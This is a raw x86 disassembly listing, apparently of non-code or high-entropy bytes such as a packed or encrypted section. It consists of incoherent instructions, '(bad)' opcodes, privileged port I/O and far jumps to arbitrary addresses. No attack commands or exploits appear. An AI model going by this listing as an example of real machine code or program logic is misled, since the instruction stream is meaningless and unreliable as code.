  411888:	fisttp QWORD PTR [ebp+ecx*4-0x2b]
  41188c:	adc    ch,BYTE PTR ds:0xaadca50c
  411892:	or     DWORD PTR [ebx+0x36e4df04],edi
  411898:	xor    bl,ah
  41189a:	cdq    
  41189b:	in     ax,dx
  41189d:	push   esi
  41189e:	xchg   ecx,eax
  41189f:	mov    WORD PTR [ebx],cs
  4118a1:	je     0x4118ec
  4118a3:	pusha  
  4118a4:	sbb    ebx,DWORD PTR ds:0xc11e52e3
  4118aa:	jmp    0xc06:0xf5390d45
  4118b1:	cdq    
  4118b2:	sar    dh,cl
  4118b4:	xchg   esp,eax
  4118b5:	test   BYTE PTR ds:0x81429e12,ch
  4118bb:	test   BYTE PTR [esp+esi*8-0x44],dl
  4118bf:	out    dx,al
  4118c0:	je     0x41191d
  4118c2:	and    edx,DWORD PTR ss:[ebx]
  4118c5:	enter  0xabf3,0x12
  4118c9:	xor    ch,dh
  4118cb:	pop    edi
  4118cc:	xchg   esp,eax
  4118cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ce:	jne    0x411920
  4118d0:	jae    0x4118a1
  4118d2:	pushf  
  4118d3:	lahf   
  4118d4:	shr    DWORD PTR cs:[edx],0x73
  4118d8:	or     DWORD PTR [esi+0x36b620f9],edx
  4118de:	lock sbb DWORD PTR [ebp-0x268aeb64],0x4e
  4118e6:	push   cs
  4118e7:	push   ss
  4118e8:	xor    ebp,DWORD PTR [esi+0x7d]
  4118eb:	dec    esp
  4118ec:	leave  
  4118ed:	xchg   edx,eax
  4118ee:	fidivr DWORD PTR [edx-0x1a443156]
  4118f4:	loopne 0x4118d2
  4118f6:	ror    DWORD PTR [esi-0x520b1c84],1
  4118fc:	mov    ch,0x14
  4118fe:	(bad)  
  411900:	mov    ?,WORD PTR [edx-0x32733ee1]
  411906:	call   0x4c257cf9
  41190b:	ds jle 0x4118e4
  41190e:	(bad)  
  41190f:	jb     0x4118e2
  411911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411912:	fld    TBYTE PTR [edi]
  411914:	lahf   
  411915:	loope  0x4118b3
  411917:	rcl    DWORD PTR [eax+0x731e192e],cl
  41191d:	js     0x4118cb
  41191f:	xchg   ebp,eax
  411920:	sub    edx,ebp
  411922:	pop    es
  411923:	ins    BYTE PTR es:[edi],dx
  411924:	sub    ebx,0xffffffd0
  411927:	in     al,0xce
  411929:	out    0xa9,al
  41192b:	xchg   edx,eax
  41192c:	push   ebp
  41192d:	mov    ds:0x826e3cc1,al
  411932:	and    BYTE PTR [edx+0x2],0xf7
  411936:	sub    eax,0xca63e912
  41193b:	mov    WORD PTR ds:0xf9f1c9ec,gs
  411941:	dec    ebx
  411942:	pop    ecx
  411943:	call   0xb365b5cd
  411948:	cwde   
  411949:	sub    ah,ah
  41194b:	mov    esi,0x94229eac
  411950:	rcr    DWORD PTR [edi-0x7eafe94c],1
  411956:	retf   
  411957:	sahf   
  411958:	inc    edx
  411959:	mov    bh,0x14
  41195b:	mov    ds:0xd699c235,al
  411960:	push   cs
  411961:	mov    esi,0x4ab10b70
  411966:	ffreep st(2)
  411968:	add    dl,BYTE PTR [edx]
  41196a:	mov    ds:0xd8bb32dc,eax
  41196f:	rcr    BYTE PTR [edi-0x4016259e],0xb6
  411976:	lea    ecx,[ebx-0x77c78018]
  41197c:	call   0x4970:0x169f63d6
  411983:	imul   ecx,ebx,0x16
  411986:	or     DWORD PTR [esi-0x36],ebx
  411989:	mov    ebp,0x1202f90e
  41198e:	not    DWORD PTR [edx-0x54973794]
  411994:	push   edx
  411995:	mov    bh,0x8a
  411997:	(bad)  
  411998:	dec    ebx
  411999:	jno    0x4119ed
  41199b:	fimul  DWORD PTR ds:0xdd4611e0
  4119a1:	dec    ebp
  4119a2:	mul    BYTE PTR [edi]
  4119a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119a5:	mov    bl,0x42
  4119a7:	dec    eax
  4119a8:	and    eax,0xc152de8b
  4119ad:	mov    al,ds:0xbff7af44
  4119b2:	push   cs
  4119b3:	xchg   esi,eax
  4119b4:	sub    eax,ecx
  4119b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119b7:	xchg   esi,eax
  4119b8:	add    dl,al
  4119ba:	mov    bh,0xb6
  4119bc:	aam    0x7f
  4119be:	fsubr  DWORD PTR [ebp+0x1b]
  4119c1:	adc    ch,cl
  4119c3:	fld    st(4)
  4119c5:	rcr    BYTE PTR [ebp+0x5a],cl
  4119c8:	mov    ?,WORD PTR [ecx-0x7d]
  4119cb:	es stc 
  4119cd:	mov    DWORD PTR [ecx+0x73b9ea1],ebp
  4119d3:	jb     0x4119a6
  4119d5:	inc    eax
  4119d6:	mov    eax,ds:0xcae68cd7
  4119db:	out    0x71,eax
  4119dd:	imul   ebp,DWORD PTR [eax-0x3c1c47fb],0xfffffffa
  4119e4:	pusha  
  4119e5:	aas    
  4119e6:	and    DWORD PTR [ebx],0x20567a39
  4119ec:	mov    ss,WORD PTR [edx+ebp*4-0x4f]
  4119f0:	pop    esp
  4119f1:	loope  0x411a4b
  4119f3:	leave  
  4119f4:	xlat   BYTE PTR ds:[ebx]
  4119f5:	(bad)  
  4119f6:	(bad)  
  4119f7:	cmp    dh,BYTE PTR [eax+0x176d5456]
  4119fd:	mov    WORD PTR [ebx],ds
  4119ff:	push   edi
  411a00:	fistp  QWORD PTR [eax+0x6525db6e]
  411a06:	adc    bh,BYTE PTR [ecx+edi*4+0x47a1054b]
  411a0d:	ror    BYTE PTR [ebx+0x21],0xce
  411a11:	in     al,0x87
  411a13:	adc    DWORD PTR [edx-0x47],ebx
  411a16:	adc    al,bl
  411a18:	add    esp,esi
  411a1a:	cmp    BYTE PTR [ebp+0x65089d91],dh
  411a20:	repnz sbb eax,0x4ec407be
  411a26:	and    eax,0xf66a6b08
  411a2b:	mov    ebx,0x9dc8a7a9
  411a30:	stos   DWORD PTR es:[edi],eax
  411a31:	imul   esi,DWORD PTR [ebx+0x7a],0x4e44f814
  411a38:	int    0x2b
  411a3a:	adc    al,ah
  411a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a3d:	int    0x40
  411a3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a41:	push   ecx
  411a42:	push   ebx
  411a43:	mov    dl,BYTE PTR [ebx+0x587a0d14]
  411a49:	adc    al,0xb1
  411a4b:	jb     0x411aa7
  411a4d:	mov    bl,0x49
  411a4f:	addr16 inc ebx
  411a51:	iret   
  411a52:	jo     0x4119fc
  411a54:	or     eax,0xaa50751a
  411a59:	mov    ds:0x893bad5f,al
  411a5e:	pop    edi
  411a5f:	jle    0x411aaf
  411a61:	or     ebp,ecx
  411a63:	mov    ds:0x33d8006c,al
  411a68:	lods   eax,DWORD PTR ds:[esi]
  411a69:	mov    ecx,0x8015bf58
  411a6e:	push   edi
  411a6f:	push   edx
  411a70:	dec    edi
  411a71:	in     eax,0x56
  411a73:	scas   eax,DWORD PTR es:[edi]
  411a74:	jg     0x411a51
  411a76:	add    ch,al
  411a78:	mov    ebx,0xba8290ac
  411a7d:	sbb    DWORD PTR [edi+0x6a],ecx
  411a80:	ret    
  411a81:	inc    esi
  411a82:	add    al,BYTE PTR [edx+edx*1]
  411a85:	inc    edx
  411a86:	pop    ebp
  411a87:	cmp    al,0x14
  411a89:	add    al,0x45
  411a8b:	xlat   BYTE PTR ds:[ebx]
  411a8c:	mov    dl,0x64
  411a8e:	popf   
  411a8f:	and    eax,0x735ff46d
  411a94:	repnz pop ebp
  411a96:	jo     0x411ad0
  411a98:	in     eax,0x11
  411a9a:	in     al,0x7b
  411a9c:	cmp    al,0x15
  411a9e:	or     al,0xeb
  411aa1:	lahf   
  411aa2:	xlat   BYTE PTR ds:[ebx]
  411aa3:	imul   ebp,DWORD PTR [edi-0x7d],0x28990734
  411aaa:	scas   eax,DWORD PTR es:[edi]
  411aab:	mov    al,ds:0x32937b32
  411ab0:	dec    ebx
  411ab1:	daa    
  411ab2:	push   eax
  411ab3:	cmp    eax,0xcf243574
  411ab8:	imul   esp,DWORD PTR [esp+eiz*4],0xf384ee25
  411abf:	mov    esp,0x1e76c036
  411ac4:	outs   dx,BYTE PTR ds:[esi]
  411ac5:	mov    eax,ds:0xcda3548d
  411aca:	addr16 clc 
  411acc:	adc    eax,0x909106b1
  411ad1:	adc    BYTE PTR [esi+0x5e],0x2f
  411ad5:	push   ebx
  411ad6:	bound  ecx,QWORD PTR [edi]
  411ad8:	mov    ebp,0xff9a6ec4
  411add:	(bad)  
  411adf:	cli    
  411ae0:	add    BYTE PTR [edi],al
  411ae2:	add    DWORD PTR [edx],esp
  411ae4:	mov    dl,0x4b
  411ae6:	shl    DWORD PTR [edx],0xac
  411ae9:	into   
  411aea:	pop    esi
  411aeb:	ret    0xcbbc
  411aee:	sub    BYTE PTR [ebp+0x5a75b4b],al
  411af4:	or     eax,0xfc4310f1
  411af9:	mov    ebp,0x8ec3fd2d
  411afe:	jl     0x411b5b
  411b00:	fimul  DWORD PTR [eax-0x1b3fa98f]
  411b06:	dec    esp
  411b07:	add    BYTE PTR ds:0x5def1ffc,dl
  411b0d:	jbe    0x411b3f
  411b0f:	mov    ebx,0xbf09df2e
  411b14:	fs dec esi
  411b16:	call   0x55df:0xe4263706
  411b1d:	(bad)  
  411b1e:	jmp    0x411b99
  411b20:	pop    ecx
  411b21:	dec    edi
  411b22:	loopne 0x411b17
  411b24:	ins    BYTE PTR es:[edi],dx
  411b25:	cmp    al,ch
  411b27:	mov    ebx,0x12741137
  411b2c:	fist   DWORD PTR [edi-0x172b2fb7]
  411b32:	xchg   BYTE PTR [ebp-0xc],ah
  411b35:	pand   mm3,QWORD PTR [ebp+0x17]
  411b39:	enter  0x9adb,0xd7
  411b3d:	shl    DWORD PTR [eiz*4-0x40426dd2],0xb2
  411b45:	jbe    0xab1cb71f
  411b4b:	adc    eax,DWORD PTR [ebp-0x44b9620a]
  411b51:	push   esp
  411b52:	imul   ebp,DWORD PTR [eax],0xffffffdf
  411b55:	push   0x16
  411b57:	jns    0x411b7d
  411b59:	add    eax,0x9a85288d
  411b5e:	push   ebx
  411b5f:	inc    ebx
  411b60:	sti    
  411b61:	scas   eax,DWORD PTR es:[edi]
  411b62:	sub    ecx,ebx
  411b64:	neg    BYTE PTR [eax+0x47cf900b]
  411b6a:	ds stc 
  411b6c:	test   BYTE PTR [edi+0x1af9b99e],ah
  411b72:	xor    ebx,edx
  411b74:	add    bh,ch
  411b76:	inc    edx
  411b77:	stc    
  411b78:	stc    
  411b79:	xor    DWORD PTR [edx],esi
  411b7b:	pop    es
  411b7c:	add    al,BYTE PTR [edx+eax*1+0x76016ba5]
  411b83:	in     al,dx
  411b84:	lock cld 
  411b86:	mov    edi,0x63f9f80b
  411b8b:	repnz sub BYTE PTR [edi+eax*8],cl
  411b8f:	loopne 0x411b2d
  411b91:	inc    ebp
  411b93:	jg     0x411b9b
  411b95:	sti    
  411b96:	sbb    ch,0x6
  411b99:	mul    BYTE PTR [edi-0x1b]
  411b9c:	pop    ecx
  411b9d:	sub    dh,BYTE PTR [ecx+0x6392f903]
  411ba3:	mov    ebx,0x59128ce7
  411ba8:	add    BYTE PTR [ebp+0x62],dh
  411bab:	xchg   edi,eax
  411bac:	pop    esi
  411bad:	cmp    dl,0x69
  411bb0:	shl    BYTE PTR [esi+0x49],cl
  411bb3:	les    edx,FWORD PTR [edx-0x26]
  411bb6:	push   ss
  411bb7:	addr16 xor DWORD PTR ds:0x317,0x2f5f17e8
  411bc1:	or     eax,0x69d2647f
  411bc6:	and    al,0x3c
  411bc8:	or     eax,0x99e628e6
  411bcd:	ret    
  411bce:	ins    BYTE PTR es:[edi],dx
  411bcf:	loope  0x411b66
  411bd1:	jmp    0x2c71fbd6
  411bd6:	xchg   DWORD PTR [ecx-0x4c03717f],ecx
  411bdc:	out    0x2d,al
  411bde:	sti    
  411bdf:	fld    DWORD PTR [ecx-0x59]
  411be2:	pusha  
  411be3:	aas    
  411be4:	(bad)  
  411be6:	cmp    esi,DWORD PTR [edi+0x29]
  411be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bea:	daa    
  411beb:	xchg   ebx,eax
  411bec:	mov    ch,0xa2
  411bee:	sbb    BYTE PTR gs:[esi+eax*4-0x4898fc32],ch
  411bf6:	cmp    al,0xbe
  411bf8:	in     eax,0x9f
  411bfa:	pop    esp
  411bfb:	js     0x411c44
  411bfd:	stos   BYTE PTR es:[edi],al
  411bfe:	es xchg ebx,eax
  411c00:	mov    bl,0x96
  411c02:	inc    esp
  411c03:	add    esp,DWORD PTR [eax+0x57]
  411c06:	mov    eax,0xe1535c7d
  411c0b:	ret    0xfe9c
  411c0e:	inc    eax
  411c0f:	cwde   
  411c10:	xor    eax,0x77e6d9ba
  411c15:	hlt    
  411c16:	loop   0x411c7e
  411c18:	xchg   ebp,eax
  411c19:	loop   0x411be4
  411c1b:	jae    0x411bee
  411c1d:	cmp    DWORD PTR [esi-0xf],0xffffff9b
  411c21:	mov    cl,0x93
  411c23:	popa   
  411c24:	out    dx,eax
  411c25:	pop    ebp
  411c26:	ins    BYTE PTR es:[edi],dx
  411c27:	ror    ecx,cl
  411c29:	fdivr  st,st(6)
  411c2b:	out    dx,eax
  411c2c:	jbe    0x411bf8
  411c2e:	nop
  411c2f:	mov    ebx,0xd64af635
  411c34:	ror    DWORD PTR [eax],0x26
  411c37:	adc    ah,cl
  411c39:	or     BYTE PTR [eax+0x5e],dh
  411c3c:	addr16 aam 0x27
  411c3f:	call   0x2acb:0xb27a7b1e
  411c46:	test   DWORD PTR [eax+esi*2-0x19ce167],0xa4aeffa1
  411c51:	repnz cmc 
  411c53:	mov    bh,BYTE PTR [ebp-0x72]
  411c56:	xor    eax,0x62c490e9
  411c5b:	pop    eax
  411c5c:	or     bl,BYTE PTR [ebx]
  411c5e:	push   esp
  411c5f:	sub    eax,DWORD PTR [eax+0x1125732]
  411c65:	or     cl,BYTE PTR [edx-0xd]
  411c68:	test   eax,0x815f6818
  411c6d:	ja     0x411c0f
  411c6f:	(bad)  [esi-0x13]
  411c72:	sahf   
  411c73:	jae    0x411c75
  411c75:	sub    dh,BYTE PTR [ebx-0x10]
  411c78:	retf   0xdf07
  411c7b:	icebp  
  411c7c:	push   esi
  411c7d:	mov    bl,0xa0
  411c7f:	mov    ch,0xf2
  411c81:	adc    BYTE PTR [ebx+0x23],dl
  411c84:	sbb    al,BYTE PTR [esi]
  411c86:	les    esi,FWORD PTR [ebx+0x8]
  411c89:	test   DWORD PTR [eax+0xd],edx
  411c8c:	ins    BYTE PTR es:[edi],dx
  411c8d:	icebp  
  411c8e:	or     al,0x13
  411c90:	scas   eax,DWORD PTR es:[edi]
  411c91:	sti    
  411c92:	cmp    DWORD PTR [esi],eax
  411c94:	mov    eax,0x6de4407e
  411c99:	ret    0x16fe
  411c9c:	sbb    al,0x40
  411c9e:	in     eax,dx
  411c9f:	ret    0xca48
  411ca2:	test   eax,0x9efa7330
  411ca7:	sub    eax,DWORD PTR ds:0xe2ea4fdb
  411cad:	xchg   ch,dl
  411caf:	ret    
  411cb0:	push   eax
  411cb1:	pop    esi
  411cb2:	iret   
  411cb3:	out    0xf2,al
  411cb5:	jne    0x411cb5
  411cb7:	pop    ecx
  411cb8:	and    BYTE PTR [eax+0xe],ch
  411cbb:	adc    eax,0x1962ef1e
  411cc0:	imul   ebx,DWORD PTR [edi-0x32862f67],0xffffff8c
  411cc7:	shl    DWORD PTR ds:[esi+0x6577e511],cl
  411cce:	pop    ebp
  411ccf:	ss dec esi
  411cd1:	sub    bh,BYTE PTR [edx]
  411cd3:	and    BYTE PTR ds:0x6d4342f7,0xd
  411cda:	sar    DWORD PTR [edx-0x21],cl
  411cdd:	jl     0x411d36
  411cdf:	xchg   edx,eax
  411ce0:	pusha  
  411ce1:	sbb    ah,bh
  411ce3:	jne    0x411d44
  411ce5:	inc    esi
  411ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce7:	jne    0x411ce1
  411ce9:	fwait
  411cea:	outs   dx,BYTE PTR ds:[esi]
  411ceb:	sub    al,0xde
  411ced:	and    BYTE PTR [edx],0x67
  411cf0:	(bad)  
  411cf1:	push   ecx
  411cf2:	push   ss
  411cf3:	mov    cl,0xe3
  411cf5:	push   esp
  411cf6:	les    eax,FWORD PTR [ecx]
  411cf8:	dec    ebp
  411cf9:	inc    edi
  411cfa:	repnz aam 0xd2
  411cfd:	jp     0x411ca2
  411cff:	fdiv   QWORD PTR [ebx-0x2e]
  411d02:	out    dx,al
  411d03:	out    0x8,al
  411d05:	jns    0x411c8f
  411d07:	or     al,0x18
  411d09:	adc    eax,0x9d906225
  411d0e:	dec    ebx
  411d0f:	sbb    DWORD PTR ds:0x759852ae,ebx
  411d15:	ror    BYTE PTR [ebp+0x69bbbece],1
  411d1b:	js     0x411cfa
  411d1d:	lea    esi,[ebp-0x4e]
  411d20:	cld    
  411d21:	jnp    0x411d07
  411d23:	dec    esp
  411d24:	fwait
  411d25:	rcr    esi,0x4a
  411d28:	aam    0x1
  411d2a:	fs out dx,eax
  411d2c:	dec    ebx
  411d2d:	xor    DWORD PTR [ebp+esi*1-0x6d79e4b7],edx
  411d34:	mov    dh,0xef
  411d36:	cmp    eax,0xf5a3bc9a
  411d3b:	ffree  st(2)
  411d3d:	sub    edi,DWORD PTR [edi-0xd]
  411d40:	mov    ebp,0xe7a2fe83
  411d45:	ja     0x411d8c
  411d47:	(bad)  [ebp-0x6e20e4ea]
  411d4d:	xor    edx,DWORD PTR [esi+0x32]
  411d50:	dec    esi
  411d51:	pushf  
  411d52:	fnstcw WORD PTR [ebp+0x5a]
  411d55:	pop    ds
  411d56:	popa   
  411d57:	mov    ds:0x3f3692f3,eax
  411d5c:	cmp    dh,bl
  411d5e:	das    
  411d5f:	sbb    BYTE PTR [eax+eiz*1-0x25d98060],cl
  411d66:	mov    ds:0x69b18ecc,al
  411d6b:	xchg   esp,eax
  411d6c:	js     0x411d44
  411d6e:	sub    eax,0x5b770836
  411d73:	mov    edi,0x986ead47
  411d78:	rcl    DWORD PTR [edi-0x8],cl
  411d7b:	dec    eax
  411d7c:	arpl   cx,ax
  411d7e:	int    0xdb
  411d80:	push   es
  411d81:	add    al,BYTE PTR [eax-0x32a4d230]
  411d87:	xchg   ebx,eax
  411d88:	mov    cl,0x6
  411d8a:	push   ss
  411d8b:	dec    DWORD PTR [esi+0x79383746]
  411d91:	mov    edi,0xa119e167
  411d96:	fcmovne st,st(5)
  411d98:	jno    0x411ddf
  411d9a:	mov    BYTE PTR [esi+eax*8],cl
  411d9d:	inc    esp
  411d9e:	sbb    eax,0x139efaef
  411da3:	cmp    BYTE PTR ds:0x194fcdb6,ch
  411da9:	in     eax,0x1f
  411dab:	pop    ebx
  411dac:	dec    ecx
  411dad:	int    0x1b
  411daf:	repnz push 0x56
  411db2:	pop    esp
  411db3:	(bad)  
  411db4:	in     eax,dx
  411db5:	not    BYTE PTR [edi-0x6b]
  411db8:	int    0xcb
  411dba:	mov    esi,0xf5fc55c6
  411dbf:	bound  edi,QWORD PTR [eax-0x4b]
  411dc2:	sub    al,BYTE PTR [esi]
  411dc4:	mov    edi,ecx
  411dc6:	pop    ecx
  411dc7:	shl    eax,0xa6
  411dca:	cmc    
  411dcb:	cmp    al,0x25
  411dcd:	mul    BYTE PTR [esi+0x6ce8920a]
  411dd3:	mov    ds:0x8ba6cfab,eax
  411dd8:	icebp  
  411dd9:	leave  
  411dda:	inc    eax
  411ddb:	gs mov dh,0x27
  411dde:	pop    esp
  411ddf:	adc    al,0x74
  411de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411de2:	mov    cl,0x2
  411de4:	and    eax,0x93f124c6
  411de9:	cmp    bl,BYTE PTR [edi+eiz*4]
  411dec:	fnsave [esi-0x2a]
  411def:	or     eax,0x2250901f
  411df4:	cmp    al,0x5
  411df6:	mov    ds:0x902345e8,eax
  411dfb:	pop    ss
  411dfc:	es sbb edi,esp
  411dff:	xor    edi,DWORD PTR [esi+0x39d7b27]
  411e05:	mov    ebp,0xbdee74fa
  411e0a:	loop   0x411db2
  411e0c:	stos   DWORD PTR es:[edi],eax
  411e0d:	push   ecx
  411e0e:	into   
  411e0f:	das    
  411e10:	xchg   DWORD PTR [eax-0x3],esi
  411e13:	mov    al,BYTE PTR [edi]
  411e15:	in     eax,0x16
  411e17:	loope  0x411df4
  411e19:	test   BYTE PTR [esi+ecx*8-0x60f064d5],bl
  411e20:	jp     0x411dd5
  411e22:	mov    dl,BYTE PTR [edx]
  411e24:	cld    
  411e25:	inc    esp
  411e26:	mov    DWORD PTR [ebx-0x6fdf4d4f],edi
  411e2c:	js     0x411e47
  411e2e:	jmp    0x411df6
  411e30:	icebp  
  411e31:	add    ch,ch
  411e33:	lock pop esi
  411e35:	inc    eax
  411e36:	(bad)  
  411e37:	mov    es,WORD PTR [ebx+0x43]
  411e3a:	push   ecx
  411e3b:	fs pop ecx
  411e3d:	xor    al,0x15
  411e3f:	cmp    eax,0x8dc1a3e6
  411e44:	(bad)  
  411e45:	sahf   
  411e46:	dec    esp
  411e47:	rol    BYTE PTR [ecx-0x75defdf6],cl
  411e4d:	in     al,dx
  411e4e:	mov    esp,0x77119466
  411e53:	jl     0x411e96
  411e55:	lahf   
  411e56:	jl     0x411ebe
  411e58:	xchg   ebp,eax
  411e59:	mov    dl,0x3e
  411e5b:	shr    DWORD PTR [edx-0x6de66f64],cl
  411e61:	scas   al,BYTE PTR es:[edi]
  411e62:	cmp    BYTE PTR [ebx-0x13],0x1
  411e66:	sahf   
  411e67:	mov    WORD PTR [ebx],ds
  411e69:	adc    DWORD PTR [ebx+ebx*8],ebx
  411e6c:	das    
  411e6d:	mov    ss,WORD PTR [eax]
  411e6f:	enter  0x49de,0x4a
  411e73:	jg     0x411ebf
  411e75:	das    
  411e76:	in     al,0xb9
  411e78:	inc    ebx
  411e79:	aam    0x33
  411e7b:	mov    ebp,DWORD PTR [edi-0x207dda2b]
  411e81:	add    DWORD PTR [edi-0x4790d55d],ecx
  411e87:	aas    
  411e88:	arpl   dx,ax
  411e8a:	cmp    eax,0x7a
  411e8d:	arpl   ax,bx
  411e8f:	into   
  411e90:	and    eax,DWORD PTR [ebx*4-0x64e3086a]
  411e97:	push   ds
  411e98:	outs   dx,BYTE PTR ds:[esi]
  411e99:	lahf   
  411e9a:	dec    ebp
  411e9b:	add    eax,0xff167c8f
  411ea0:	lock retf 
  411ea2:	lods   al,BYTE PTR ds:[esi]
  411ea3:	push   esp
  411ea4:	push   es
  411ea5:	add    al,0x38
  411ea7:	popf   
  411ea8:	cmc    
  411ea9:	jbe    0x411e4c
  411eab:	scas   eax,DWORD PTR es:[edi]
  411eac:	test   DWORD PTR [edx],0x2ac1f896
  411eb2:	retf   
  411eb3:	inc    ebp
  411eb4:	test   eax,0x8bf7b627
  411eb9:	mov    esp,0x3976c171
  411ebe:	or     ebp,esi
  411ec0:	and    BYTE PTR [edx-0xa],ch
  411ec3:	push   esi
  411ec4:	mov    cl,BYTE PTR [esi-0x48]
  411ec7:	mov    esi,0x1f677e21
  411ecc:	push   cs
  411ecd:	push   ds
  411ece:	or     eax,DWORD PTR [eiz*2+0x1b214a5]
  411ed5:	mov    ebx,0x48d9a847
  411eda:	push   esi
  411edb:	test   BYTE PTR [ebx],dh
  411edd:	cmp    al,0x38
  411edf:	loope  0x411f17
  411ee1:	not    BYTE PTR ss:[ebx-0x70]
  411ee5:	std    
  411ee6:	xchg   esp,eax
  411ee7:	push   ecx
  411ee8:	leave  
  411ee9:	ret    0xa4e7
  411eec:	sub    al,0xb3
  411eee:	push   ebp
  411eef:	rcr    DWORD PTR [edx+0x17d46528],1
  411ef5:	sub    al,0x3b
  411ef7:	(bad)  
  411ef8:	mov    ds:0xc8d1eb50,eax
  411efd:	push   ebx
  411efe:	xchg   BYTE PTR [ebx-0x1],ah
  411f01:	das    
  411f02:	mov    al,ds:0x72a02caf
  411f07:	test   eax,0x454210c7
  411f0c:	popf   
  411f0d:	mov    BYTE PTR [ecx+0x100c0e96],ah
  411f13:	bound  esp,QWORD PTR [eax-0x56]
  411f16:	ftst   
  411f18:	mov    BYTE PTR [edi-0x7e],ah
  411f1b:	aaa    
  411f1c:	add    eax,0xf9082646
  411f21:	test   al,0xc2
  411f23:	cwde   
  411f24:	jmp    0xdf00:0xfaebcc35
  411f2b:	dec    ecx
  411f2c:	sahf   
  411f2d:	iret   
  411f2e:	rcr    BYTE PTR [esp+ebp*2-0x36],0x4e
  411f33:	test   esp,edi
  411f35:	mov    al,ds:0xfd70359d
  411f3a:	les    ecx,FWORD PTR [edi]
  411f3c:	scas   eax,DWORD PTR es:[edi]
  411f3d:	jl     0x411f57
  411f3f:	or     al,0x56
  411f41:	sbb    cl,ch
  411f43:	(bad)  
  411f44:	scas   al,BYTE PTR es:[edi]
  411f45:	cmp    ah,bh
  411f47:	pusha  
  411f48:	mov    ds:0xf66a7414,eax
  411f4d:	(bad)  
  411f4e:	and    BYTE PTR [edx],ah
  411f50:	xor    ebp,esp
  411f52:	into   
  411f53:	pop    ebx
  411f54:	or     BYTE PTR [eax-0x28fecd05],al
  411f5a:	adc    al,BYTE PTR [esi]
  411f5c:	sti    
  411f5d:	addr16 push edi
  411f5f:	test   al,0x51
  411f61:	pop    es
  411f62:	jle    0x411efc
  411f64:	xlat   BYTE PTR ds:[ebx]
  411f65:	pop    ebx
  411f66:	lds    ebp,FWORD PTR [edx+0x34256d38]
  411f6c:	call   0x3c2d568d
  411f71:	(bad)  
  411f73:	(bad)  
  411f74:	ins    BYTE PTR es:[edi],dx
  411f75:	fsubp  st(0),st
  411f77:	fwait
  411f78:	jns    0x411f01
  411f7a:	sub    edi,DWORD PTR [edi+0x5200d074]
  411f80:	or     DWORD PTR [eax],ebp
  411f82:	out    dx,eax
  411f83:	in     al,dx
  411f84:	call   0x3905:0x46bdd82b
  411f8b:	ret    
  411f8c:	cmp    eax,0x1f45d2c
  411f91:	cmp    cl,BYTE PTR [edi]
  411f93:	inc    edx
  411f94:	push   edi
  411f95:	sahf   
  411f96:	push   edi
  411f97:	mov    al,ds:0x36abc2fe
  411f9c:	stc    
  411f9d:	add    dl,bl
  411f9f:	push   cs
  411fa0:	ins    DWORD PTR es:[edi],dx
  411fa1:	fld    DWORD PTR [eax]
  411fa3:	add    al,0xcc
  411fa5:	lods   eax,DWORD PTR ds:[esi]
  411fa6:	cmp    eax,0xd11ce192
  411fab:	(bad)  
  411fac:	lods   al,BYTE PTR ds:[esi]
  411fad:	cmp    esi,esp
  411faf:	test   BYTE PTR [ebp+ebx*8-0x5c],dh
  411fb3:	in     al,0x4b
  411fb5:	pop    es
  411fb6:	or     BYTE PTR [esi],0xbb
  411fb9:	pop    eax
  411fba:	inc    edx
  411fbb:	add    DWORD PTR [edi-0x3d0b5a70],esp
  411fc1:	sub    al,0xa8
  411fc3:	adc    esi,DWORD PTR [esi]
  411fc5:	cmp    al,0x72
  411fc7:	sar    BYTE PTR [edi],1
  411fc9:	jecxz  0x412002
  411fcb:	fstp   QWORD PTR [ebx]
  411fcd:	ficom  WORD PTR ds:0x86aa9ef6
  411fd3:	or     eax,0xed63e5c
  411fd8:	adc    DWORD PTR [esp+eax*8-0x28],0xffffff92
  411fdd:	gs out 0x2c,eax
  411fe0:	out    dx,al
  411fe1:	pop    eax
  411fe2:	push   ds
  411fe3:	inc    ebx
  411fe4:	dec    ecx
  411fe5:	jae    0x41204e
  411fe7:	ins    DWORD PTR es:[edi],dx
  411fe8:	aaa    
  411fe9:	lock jmp 0x9ef3:0xc0942c66
  411ff1:	dec    eax
  411ff2:	jmp    0x412048
  411ff4:	xchg   esp,eax
  411ff5:	mov    ds:0xd49684d1,al
  411ffa:	mov    ch,0xf8
  411ffc:	outs   dx,BYTE PTR ds:[esi]
  411ffd:	inc    edi
  411ffe:	mov    ds:0xb1d01136,al
  412003:	lahf   
  412004:	mov    ah,0x30
  412006:	lahf   
  412007:	(bad)
  41200a:	fcmovnb st,st(1)
  41200c:	add    DWORD PTR [ebp-0x54c84d91],ebp
  412012:	popa   
  412013:	cmp    eax,0x98e32eba
  412018:	mov    ds,WORD PTR [edi+0x32]
  41201b:	cmp    ebx,ecx
  41201d:	out    dx,al
  41201e:	arpl   WORD PTR [eax-0x22],bx
  412021:	dec    edi
  412022:	adc    edx,esp
  412024:	ds push ss
  412026:	or     BYTE PTR [esi],ah
  412028:	mov    ds:0x8ae84e98,eax
  41202d:	xchg   bh,dh
  41202f:	mov    ds:0xfae79d9,al
  412034:	push   0x1094ee6d
  412039:	mov    al,ds:0x2ae4ded0
  41203e:	sbb    eax,0x4dc870da
  412043:	mov    bl,0x53
  412045:	pop    ss
  412046:	hlt    
  412047:	cwde   
  412048:	or     esp,DWORD PTR [edi]
  41204a:	and    DWORD PTR [eax-0x66],edi
  41204d:	je     0x4120bb
  41204f:	dec    edi
  412050:	mov    edx,0x8144709e
  412055:	loopne 0x411ff7
  412057:	mov    BYTE PTR [esi+ebp*4+0x2d],bh
  41205b:	jae    0x411ff3
  41205d:	and    esi,esi
  41205f:	add    al,0x3a
  412061:	inc    edx
  412062:	cmp    esp,DWORD PTR [edi+0x2ad50e37]
  412068:	pop    esi
  412069:	fst    QWORD PTR [ebx+0x11]
  41206c:	les    ebp,FWORD PTR [esi]
  41206e:	push   ebx
  41206f:	addr16 mov edx,0x83da1433
  412075:	sub    esi,esp
  412077:	cs mov esi,gs
  41207a:	ins    BYTE PTR es:[edi],dx
  41207b:	and    al,0x76
